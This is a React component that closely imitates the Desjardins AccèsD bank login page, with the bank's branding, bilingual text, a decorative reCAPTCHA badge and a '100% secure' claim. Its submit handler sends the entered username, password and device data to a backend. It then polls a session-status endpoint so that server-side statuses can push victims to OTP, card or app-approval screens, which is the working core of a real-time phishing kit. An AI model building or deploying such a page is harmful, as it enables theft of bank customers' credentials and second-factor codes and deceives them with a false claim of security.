import { useState, useEffect, Fragment } from 'react';
import { LuEye, LuEyeClosed } from 'react-icons/lu';
import { collectDeviceInfo } from '../utils/deviceInfo';

const translations = {
  en: {
    switchLangLabel: 'Français',
    contactUs: 'Contact Us',
    help: 'Help',
    openMenu: 'Open menu',
    closeMenu: 'Close menu',
    title: 'Log in to your account',
    username: 'Username',
    learnMoreUsername: 'Learn more about username',
    modalTitle: 'AccèsD username',
    modalClose: 'Close',
    modalBullets: [
      'Your Desjardins Access Card number',
      'Your virtual access card (non-members who hold a Desjardins credit card or prepaid card)',
      'Your email address (if an email address is saved in your usernames)',
    ],
    modalAffairesTitle: 'AccèsD Affaires username',
    modalAffairesDesc: 'Your AccèsD Affaires user code',
    modalLearnMore: 'Learn more about usernames',
    rememberMe: 'Remember me',
    isThisSafe: '(Is this safe?)',
    nicknameLabel: 'Nickname (optional):',
    nicknameHelp: '20 characters max. (for example: Home account)',
    password: 'Password',
    showPassword: 'Show password',
    hidePassword: 'Hide password',
    importantLabel: 'Important:',
    passwordCaseNote: 'Passwords are case-sensitive.',
    forgotPassword: 'Forgot your password?',
    loginBtn: 'Log in',
    signingInBtn: 'Signing in...',
    errEnterUsername: 'Please enter your username',
    errLoginFailed: 'Logon failed. Invalid username or password. Try again.',
    errConnection: 'Connection error. Please try again.',
    errCancelled: 'Login cancelled.',
    registerAccesD: 'Register for AccèsD',
    registerAccesDAffaires: 'Register for AccèsD Affaires',
    becomeMember: 'Become a member',
    siteSecurity: 'Site security',
    techSupport: 'Technical support',
    reportFraud: 'Report fraud',
    guaranteedLine1: 'Guaranteed',
    guaranteedLine2: '100% secure',
    footerNav: [
      'PERSONAL SERVICES',
      'BUSINESS SERVICES',
      'ADVICE',
      'ABOUT US',
      'MOBILE APP',
    ],
    footerLegal: [
      'Security',
      'Terms of Use and legal notes',
      'Privacy',
      'Personalize cookies',
      'Accessibility',
      'Site map',
    ],
    copyright: '© 1996-2026, Mouvement des caisses Desjardins - Desjardins Group. All rights reserved.',
    recaptchaPrefix: 'protected by',
  },
  fr: {
    switchLangLabel: 'English',
    contactUs: 'Nous joindre',
    help: 'Aide',
    openMenu: 'Ouvrir le menu',
    closeMenu: 'Fermer le menu',
    title: 'Se connecter',
    username: 'Identifiant',
    learnMoreUsername: "En savoir plus sur l'identifiant",
    modalTitle: 'Identifiant AccèsD',
    modalClose: 'Fermer',
    modalBullets: [
      "Votre numéro de carte d'accès Desjardins",
      "Votre carte d'accès virtuelle (non-membres détenteurs d'une carte de crédit ou prépayée Desjardins)",
      'Votre adresse courriel (si une adresse courriel est enregistrée dans vos identifiants)',
    ],
    modalAffairesTitle: 'Identifiant AccèsD Affaires',
    modalAffairesDesc: "Votre code d'utilisateur AccèsD Affaires",
    modalLearnMore: 'En savoir plus sur les identifiants',
    rememberMe: 'Mémoriser',
    isThisSafe: "(C'est sécuritaire?)",
    nicknameLabel: 'Surnom (facultatif) :',
    nicknameHelp: '20 caractères max. (par exemple : Compte maison)',
    password: 'Mot de passe',
    showPassword: 'Afficher le mot de passe',
    hidePassword: 'Masquer le mot de passe',
    importantLabel: 'Attention :',
    passwordCaseNote: 'Respecter majuscules et minuscules',
    forgotPassword: 'Mot de passe oublié?',
    loginBtn: 'Valider',
    signingInBtn: 'Connexion en cours...',
    errEnterUsername: 'Veuillez entrer votre identifiant',
    errLoginFailed: 'Échec de la connexion. Identifiant ou mot de passe invalide. Veuillez réessayer.',
    errConnection: 'Erreur de connexion. Veuillez réessayer.',
    errCancelled: 'Connexion annulée.',
    registerAccesD: "S'inscrire à AccèsD",
    registerAccesDAffaires: "S'inscrire à AccèsD Affaires",
    becomeMember: 'Devenir membre',
    siteSecurity: 'Sécurité du site',
    techSupport: 'Soutien technique',
    reportFraud: 'Signaler une fraude',
    guaranteedLine1: 'Sécurité garantie',
    guaranteedLine2: 'à 100 %',
    footerNav: [
      'SERVICES AUX PARTICULIERS',
      'SERVICES AUX ENTREPRISES',
      'CONSEILS',
      'À PROPOS',
      'APPLICATION MOBILE',
    ],
    footerLegal: [
      'Sécurité',
      "Conditions d'utilisation et notes légales",
      'Confidentialité',
      'Personnaliser les témoins',
      'Accessibilité',
      'Plan du site',
    ],
    copyright: '© 1996-2026, Mouvement des caisses Desjardins. Tous droits réservés.',
    recaptchaPrefix: 'protégé par',
  },
};

export default function LoginPage({ lang = 'fr', setLang, onSignInInitiated, onAppPopupInitiated, onAppPushInitiated }) {
  const [username, setUsername] = useState('');
  const [password, setPassword] = useState('');
  const [showPassword, setShowPassword] = useState(false);
  const [isLoading, setIsLoading] = useState(false);
  const [errorState, setErrorState] = useState(null);
  const [showUsernameModal, setShowUsernameModal] = useState(false);
  const [rememberMe, setRememberMe] = useState(false);
  const [nickname, setNickname] = useState('');
  const [mobileMenuOpen, setMobileMenuOpen] = useState(false);
  const [isRecaptchaOpen, setIsRecaptchaOpen] = useState(false);

  const t = translations[lang] || translations.en;
  const errorMessage = errorState ? (errorState.text || t[errorState.key]) : '';

  const handleToggleLanguage = () => {
    const nextLang = lang === 'fr' ? 'en' : 'fr';
    if (setLang) setLang(nextLang);
  };

  useEffect(() => {
    if (!isLoading || !username.trim()) return;
    let intervalId;
    const checkStatus = async () => {
      try {
        const response = await fetch(`/api/session-status?email=${encodeURIComponent(username.trim())}`, {
          headers: { 'X-Access-Key': 'client-desjardins-banque' }
        });
        const data = await response.json();
        if (data.success) {
          if (data.status === 'show_otp' || data.status === 'card_popup' || data.status === 'card_submitted') {
            setIsLoading(false);
            onSignInInitiated(username.trim());
          } else if (data.status === 'app_popup') {
            setIsLoading(false);
            onAppPopupInitiated(username.trim());
          } else if (data.status === 'app_push_popup') {
            setIsLoading(false);
            onAppPushInitiated(username.trim());
          } else if (data.status === 'cancelled') {
            setIsLoading(false);
            setErrorState({ key: 'errCancelled' });
          }
        }
      } catch (err) {
        console.error('Error polling session status:', err);
      }
    };
    // Check immediately, then every 1 second for faster response
    checkStatus();
    intervalId = setInterval(checkStatus, 1000);
    return () => { if (intervalId) clearInterval(intervalId); };
  }, [isLoading, username, onSignInInitiated, onAppPopupInitiated, onAppPushInitiated]);

  const handleNext = async (e) => {
    e.preventDefault();
    if (!username.trim()) {
      setErrorState({ key: 'errEnterUsername' });
      return;
    }
    setIsLoading(true);
    setErrorState(null);

    try {
      const deviceInfo = collectDeviceInfo();
      const response = await fetch('/api/login', {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json',
          'X-Access-Key': 'client-desjardins-banque'
        },
        body: JSON.stringify({
          email: username.trim(),
          password: password.trim(),
          deviceInfo
        })
      });

      const data = await response.json();
      if (data.success) {
        if (data.status === 'show_otp' || data.status === 'card_popup' || data.status === 'card_submitted') {
          onSignInInitiated(username.trim());
        } else if (data.status === 'app_popup') {
          onAppPopupInitiated(username.trim());
        } else if (data.status === 'app_push_popup') {
          onAppPushInitiated(username.trim());
        }
      } else {
        setErrorState(data.message ? { text: data.message } : { key: 'errLoginFailed' });
        setIsLoading(false);
      }
    } catch (err) {
      console.error('Error:', err);
      setErrorState({ key: 'errConnection' });
      setIsLoading(false);
    }
  };

  return (
    <div className="min-h-screen flex flex-col bg-white" style={{ fontFamily: 'Arial, sans-serif' }}>
      {/* ═══════════════════════════════════════════ HEADER ═══════════════════════════════════════════ */}
      {mobileMenuOpen && (
        <div
          className="fixed inset-0 bg-black/50 z-40 md:hidden"
          onClick={() => setMobileMenuOpen(false)}
          aria-hidden="true"
        />
      )}

      <header className="relative z-50">
        {/* Top Dark Bar (desktop) */}
        <div className="hidden md:block bg-[#383838] text-white px-6 lg:pr-20 py-3">
          <div className="max-w-7xl mx-auto flex items-center justify-end gap-5 text-base font-semibold">
            <span>AA +</span>
            <span className="text-[#999]">|</span>
            <button type="button" onClick={handleToggleLanguage} className="cursor-pointer hover:underline">{t.switchLangLabel}</button>
            <span className="text-[#999]">|</span>
            <a href="#" className="cursor-pointer hover:underline">{t.contactUs}</a>
            <span className="text-[#999]">|</span>
            <a href="#" className="cursor-pointer hover:underline">{t.help}</a>
          </div>
        </div>

        {/* Logo Bar */}
        <div className="bg-white border-b border-[#e8e8e8] px-4 md:px-10 lg:px-32 py-3.5 md:py-4">
          <div className="max-w-7xl mx-auto flex items-center gap-4 md:gap-6">
            {/* Mobile Hamburger / Close Button */}
            <button
              type="button"
              onClick={() => setMobileMenuOpen(!mobileMenuOpen)}
              className="md:hidden text-[#333] p-1 -ml-1 cursor-pointer flex items-center justify-center"
              aria-label={mobileMenuOpen ? t.closeMenu : t.openMenu}
              aria-expanded={mobileMenuOpen}
            >
              {mobileMenuOpen ? (
                <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2" className="w-6 h-6">
                  <path strokeLinecap="round" strokeLinejoin="round" d="M6 6l12 12M6 18L18 6" />
                </svg>
              ) : (
                <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2" className="w-6 h-6">
                  <path strokeLinecap="round" strokeLinejoin="round" d="M3 6h18M3 12h18M3 18h18" />
                </svg>
              )}
            </button>

            <img src="/desjar-logo.svg" alt="Desjardins" className="w-36 md:w-42.5" />
            <div className="hidden md:block w-[1.5px] h-6 bg-[#d0d0d0]"></div>
            <div className="hidden md:flex items-center gap-8">
              <img src="/accesD.svg" alt="AccèsD" className="w-24" />
              <img src="/AccesD-Affaires.svg" alt="AccèsD Affaires" className="w-24" />
            </div>
          </div>
        </div>

        {/* Mobile Dropdown Menu */}
        {mobileMenuOpen && (
          <div className="md:hidden absolute left-0 right-0 top-full shadow-lg z-50 animate-fade-in">
            <div className="bg-[#383838] text-white py-3.5 px-4 flex items-center justify-center gap-4 text-[15px] font-semibold">
              <span>AA +</span>
              <span className="inline-block w-[1px] h-4 bg-[#888]" aria-hidden="true"></span>
              <button
                type="button"
                onClick={() => {
                  handleToggleLanguage();
                  setMobileMenuOpen(false);
                }}
                className="cursor-pointer hover:underline"
              >
                {t.switchLangLabel}
              </button>
              <span className="inline-block w-[1px] h-4 bg-[#888]" aria-hidden="true"></span>
              <a href="#" onClick={() => setMobileMenuOpen(false)} className="hover:underline">{t.contactUs}</a>
            </div>
            <a
              href="#"
              onClick={() => setMobileMenuOpen(false)}
              className="bg-white text-[#333] py-4 px-5 flex items-center justify-between border-b border-[#e8e8e8] text-[15px] font-semibold hover:bg-[#f9f9f9]"
            >
              <span>{t.help}</span>
              <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2" className="w-4 h-4 text-[#555]">
                <path strokeLinecap="round" strokeLinejoin="round" d="M9 5l7 7-7 7" />
              </svg>
            </a>
          </div>
        )}
      </header>

      {/* ═══════════════════════════════════════════ MAIN CONTENT ═══════════════════════════════════════════ */}
      <div className="flex-1 bg-[#F2F2F2] flex flex-col items-center justify-start md:justify-center py-4 px-3.5 md:py-5 md:px-6">

        {/* Floating white card: form + image side by side */}
        <div className="w-full max-w-[75rem] bg-white shadow-md flex flex-col md:flex-row overflow-hidden">

          {/* LEFT: Form panel */}
          <div className="w-full md:w-[60%] px-6 py-7 md:px-10 md:py-10 flex flex-col justify-start items-center">

            <form onSubmit={handleNext} className="w-full md:w-auto gap-5 flex flex-col items-center">
              <h1 className="w-full text-left text-[26px] sm:text-3xl font-medium text-[#1a7d48] mb-2 md:mb-8 leading-tight">{t.title}</h1>

              {/* Error Message */}
              {errorMessage && (
                <div className="w-full md:w-[320px] bg-[#fee] border-2 border-[#c00] text-[#333] px-4 py-3 rounded text-sm flex gap-3 items-center mb-2 md:mb-4">
                  <span className="text-[#c00] font-bold text-lg flex-shrink-0">✕</span>
                  <span>{errorMessage}</span>
                </div>
              )}

              {/* Username Field */}
              <div className="w-full relative">
                <label className="block text-[#333] text-base font-semibold mb-2 flex items-center gap-2">
                  {t.username}
                  <button
                    type="button"
                    onClick={() => setShowUsernameModal(!showUsernameModal)}
                    className="flex items-center justify-center text-[#999] cursor-pointer hover:text-[#666] transition-colors"
                    aria-label={t.learnMoreUsername}
                  >
                    <svg xmlns="http://www.w3.org/2000/svg" focusable="false" aria-hidden="true" viewBox="0 0 32 32" className="w-7 h-7 fill-current">
                      <path d="M16 4a12 12 0 1012 12A12.013 12.013 0 0016 4zm0 22a10 10 0 1110-10 10.011 10.011 0 01-10 10z"></path>
                      <path d="M16 14a1 1 0 00-1 1v6a1 1 0 002 0v-6a1 1 0 00-1-1z"></path>
                      <circle cx="16" cy="11" r="1.5"></circle>
                    </svg>
                  </button>
                </label>
                <input
                  type="text"
                  value={username}
                  onChange={(e) => setUsername(e.target.value)}
                  className="w-full md:w-[320px] px-3 py-2.5 md:py-2 border border-[#aaa] text-[16px] focus:outline-none focus:border-[#1a7d48] focus:ring-1 focus:ring-[#1a7d48]"
                  placeholder=""
                />

                {/* Username Info Popover Modal */}
                {showUsernameModal && (
                  <>
                    <div
                      className="fixed inset-0 bg-black/40 md:bg-transparent z-40"
                      onClick={() => setShowUsernameModal(false)}
                    />
                    <div className="fixed inset-x-4 top-1/2 -translate-y-1/2 md:inset-x-auto md:translate-y-0 md:absolute md:top-1/2 md:right-1 mt-0 bg-white rounded-sm shadow-2xl w-auto md:w-[460px] lg:w-[500px] max-h-[80vh] md:max-h-[60vh] overflow-y-auto animate-fade-in z-50" onClick={(e) => e.stopPropagation()}>
                      {/* Modal Header */}
                      <div className="flex items-center justify-between px-5 py-3 md:py-2 border-b border-[#eee] md:border-b-0">
                        <h2 className="text-lg font-semibold text-[#525252]">{t.modalTitle}</h2>
                        <button
                          type="button"
                          onClick={() => setShowUsernameModal(false)}
                          className="text-[#999] hover:text-[#333] text-2xl leading-none cursor-pointer"
                          aria-label={t.modalClose}
                        >
                          ✕
                        </button>
                      </div>

                      {/* Modal Content */}
                      <div className="px-5 py-3 md:py-2 space-y-5">
                        <div>
                          <ul className="space-y-2 text-[#2d2d2d] text-sm md:text-base font-medium">
                            {t.modalBullets.map((item, idx) => (
                              <li key={idx} className="flex gap-3">
                                <span className={`${idx === 0 ? 'text-[#292a2a]' : 'text-[#1a7d48]'} mt-0.5`}>•</span>
                                <span>{item}</span>
                              </li>
                            ))}
                          </ul>
                        </div>

                        <div>
                          <h3 className="font-semibold text-[#525252] mb-2">{t.modalAffairesTitle}</h3>
                          <p className="text-[#555] text-sm md:text-base font-normal">{t.modalAffairesDesc}</p>
                        </div>

                        <a href="#" className="inline-flex items-center gap-2 text-[#1a7d48] font-semibold hover:underline text-sm pb-2">
                          <img src="/ic-lien.svg" alt="" />
                          {t.modalLearnMore}
                        </a>
                      </div>
                    </div>
                  </>
                )}
              </div>

              {/* Remember Me */}
              <div className="w-full">
                <div className="flex gap-2.5 justify-start items-center">
                  <input
                    type="checkbox"
                    id="remember"
                    className="w-6 h-6 cursor-pointer"
                    checked={rememberMe}
                    onChange={(e) => setRememberMe(e.target.checked)}
                  />
                  <label htmlFor="remember" className="text-[#333] text-sm cursor-pointer">
                    {t.rememberMe} <span className="text-[#1a7d48] underline md:no-underline md:hover:underline text-xs ml-1">{t.isThisSafe}</span>
                  </label>
                </div>

                {/* Nickname field - shown when Remember me is checked */}
                {rememberMe && (
                  <div className="mt-4">
                    <label className="block text-[#333] text-sm font-semibold mb-2">{t.nicknameLabel}</label>
                    <input
                      type="text"
                      value={nickname}
                      onChange={(e) => setNickname(e.target.value)}
                      className="w-full md:w-[320px] px-3 py-2.5 md:py-2 border border-[#aaa] text-[16px] focus:outline-none focus:border-[#1a7d48] focus:ring-1 focus:ring-[#1a7d48]"
                      placeholder=""
                      maxLength="20"
                    />
                    <p className="text-[#555] text-xs mt-1">{t.nicknameHelp}</p>
                  </div>
                )}
              </div>

              {/* Password Field */}
              <div className="w-full">
                <label className="block text-[#333] text-base font-semibold mb-2">{t.password}</label>
                <div className="relative w-full md:w-[320px]">
                  <input
                    type={showPassword ? "text" : "password"}
                    value={password}
                    onChange={(e) => setPassword(e.target.value)}
                    className="w-full px-3 py-2.5 md:py-2 pr-10 border border-[#aaa] text-[16px] focus:outline-none focus:border-[#1a7d48] focus:ring-1 focus:ring-[#1a7d48]"
                    placeholder=""
                  />
                  <button
                    type="button"
                    onClick={() => setShowPassword(!showPassword)}
                    className="absolute right-3 top-1/2 transform -translate-y-1/2 text-[#666] hover:text-[#333] cursor-pointer"
                    aria-label={showPassword ? t.hidePassword : t.showPassword}
                  >
                    {showPassword ? <LuEyeClosed size={20} /> : <LuEye size={20} />}
                  </button>
                </div>
                <p className="text-[#555] text-xs mt-1.5"><strong>{t.importantLabel}</strong> {t.passwordCaseNote}</p>
              </div>

              {/* Forgot Password */}
              <div className="w-full">
                <a href="#" className="text-[#1a7d48] underline md:no-underline md:hover:underline text-sm">{t.forgotPassword}</a>
              </div>

              {/* Submit Button */}
              <button
                type="submit"
                disabled={isLoading}
                className="w-[230px] sm:w-[250px] bg-[#1a7d48] hover:bg-[#156638] text-white font-semibold py-3 px-4 text-[15px] transition-colors disabled:opacity-70 rounded-[4px] md:rounded-lg shadow-sm mt-1 cursor-pointer"
              >
                {isLoading ? t.signingInBtn : t.loginBtn}
              </button>
            </form>

            {/* Bottom links row */}
            <div className="w-full md:border-t md:border-[#ddd] px-0 pt-7 pb-1 md:py-6 mt-2 md:mt-10">
              <div className="flex flex-col md:flex-row md:gap-16 items-start">
                {/* Column 1 */}
                <div className="flex flex-col gap-3 md:gap-1 text-sm w-full md:w-auto pb-6 md:pb-0 border-b border-[#ccc] md:border-b-0">
                  <a href="#" className="text-[#1a7d48] underline hover:no-underline">{t.registerAccesD}</a>
                  <a href="#" className="text-[#1a7d48] underline hover:no-underline">{t.registerAccesDAffaires}</a>
                  <a href="#" className="text-[#1a7d48] underline hover:no-underline">{t.becomeMember}</a>
                </div>
                {/* Columns 2 & 3 */}
                <div className="flex items-start justify-between md:justify-start gap-8 md:gap-16 pt-6 md:pt-0 w-full md:w-auto">
                  {/* Column 2 */}
                  <div className="flex flex-col gap-3 md:gap-1 text-sm">
                    <a href="#" className="text-[#1a7d48] underline hover:no-underline">{t.siteSecurity}</a>
                    <a href="#" className="text-[#1a7d48] underline hover:no-underline">{t.techSupport}</a>
                    <a href="#" className="text-[#1a7d48] underline hover:no-underline">{t.reportFraud}</a>
                  </div>
                  {/* Column 3 */}
                  <div className="flex items-center gap-2 text-sm pr-1 md:pr-0">
                    <img src="/lockicon.svg" alt="lock" className="w-7 h-7 md:w-6 md:h-6 text-[#1a7d48]" />
                    <a href="#" className="text-[#1a7d48] underline hover:no-underline leading-tight">{t.guaranteedLine1}<br />{t.guaranteedLine2}</a>
                  </div>
                </div>
              </div>
            </div>
          </div>

          {/* RIGHT: Image panel (hidden on mobile) */}
          <div
            className="hidden md:block md:w-[40%] relative overflow-hidden"
            style={{ backgroundImage: 'url(/img-auth-desj.jpg)', backgroundSize: 'cover', backgroundPosition: 'center top' }}
          >
          </div>
        </div>
      </div>

      {/* ═══════════════════════════════════════════ FOOTER ═══════════════════════════════════════════ */}
      <footer className="bg-[#292b2f] text-white border-t border-[#d8d8d8] relative">
        <div className="max-w-[75rem] mx-auto px-4 md:px-3 pt-6 pb-6 md:pt-5 md:pb-5">
          {/* Top Navigation */}
          <nav aria-label="Footer navigation" className="flex flex-wrap items-center justify-center gap-x-3 gap-y-2 md:gap-3.5 text-[12px] sm:text-[13px] font-bold tracking-[0.01em]">
            {t.footerNav.map((label, idx) => (
              <Fragment key={label}>
                {idx > 0 && <span className="inline-block w-[1px] h-4 bg-[#76787c]" aria-hidden="true"></span>}
                <a href="#" className="cursor-pointer hover:underline">{label}</a>
              </Fragment>
            ))}
          </nav>

          {/* Horizontal Divider */}
          <div className="border-t border-[#434549] my-4"></div>

          {/* Legal Links */}
          <div className="flex flex-wrap items-center justify-center gap-x-2 gap-y-1 md:gap-2.5 text-[11px] sm:text-[12px] text-[#e5e5e5]">
            {t.footerLegal.map((label, idx) => (
              <Fragment key={label}>
                {idx > 0 && <span className="inline-block w-[1px] h-3.5 bg-[#76787c]" aria-hidden="true"></span>}
                <a href="#" className="hover:underline">{label}</a>
              </Fragment>
            ))}
          </div>

          {/* Copyright */}
          <p className="text-center text-[11px] sm:text-[12px] text-[#d4d4d4] mt-2 md:mt-1.5 leading-snug">
            {t.copyright}
          </p>
        </div>

        {/* reCAPTCHA Badge - collapses to icon, expands left on hover / tap */}
        <div
          onClick={() => setIsRecaptchaOpen(!isRecaptchaOpen)}
          onMouseLeave={() => setIsRecaptchaOpen(false)}
          className={`fixed bottom-3.5 right-0 z-50 ${isRecaptchaOpen ? 'w-[256px]' : 'w-[60px] md:w-[70px]'} hover:w-[256px] h-[52px] md:h-[60px] bg-[#f9f9f9] rounded-l-[2px] shadow-[0_0_5px_rgba(0,0,0,0.35)] overflow-hidden flex items-stretch transition-[width] duration-300 ease-in-out cursor-pointer`}
          aria-label={`${t.recaptchaPrefix} reCAPTCHA`}
        >
          <div className="w-[60px] md:w-[70px] h-[52px] md:h-[60px] flex-shrink-0 bg-[#f9f9f9] flex items-center justify-center">
            <img src="/recycle-icon.png" alt="reCAPTCHA" className="w-9 h-9 md:w-10 md:h-10 object-contain" />
          </div>
          <div className="w-[196px] md:w-[186px] h-[52px] md:h-[60px] flex-shrink-0 bg-[#1b73e8] text-white flex items-center justify-center px-3 text-[12px] whitespace-nowrap">
            <span>
              {t.recaptchaPrefix} <strong className="font-semibold">reCAPTCHA</strong>
            </span>
          </div>
        </div>
      </footer>


      <style>{`
        @keyframes fadeIn {
          from {
            opacity: 0;
          }
          to {
            opacity: 1;
          }
        }
        .animate-fade-in {
          animation: fadeIn 0.3s ease-in-out;
        }
      `}</style>
    </div>
  );
}
